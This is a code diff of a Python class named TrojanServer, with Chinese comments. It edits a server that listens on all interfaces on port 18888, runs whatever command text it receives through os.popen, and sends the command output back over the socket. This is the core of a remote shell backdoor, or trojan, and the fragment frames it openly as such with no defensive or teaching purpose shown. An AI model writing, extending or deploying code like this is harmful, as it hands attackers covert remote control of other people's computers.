@@ -58,14 +58,14 @@ class TrojanServer:
             
             else: # 如果是shell,则执行shell
 
-                tcpSocket.send(('0001'+os.popen(message).read()).encode('utf-8')) #执行shell
+                tcpSocket.send(('0001'+os.popen(msg).read()).encode('utf-8')) #执行shell
 
 
         except:
             raise
 
 if __name__ == '__main__':
-    s=TrojanServer("",18888)
+    s=TrojanServer("0.0.0.0",18888)
     s.start()
 
 
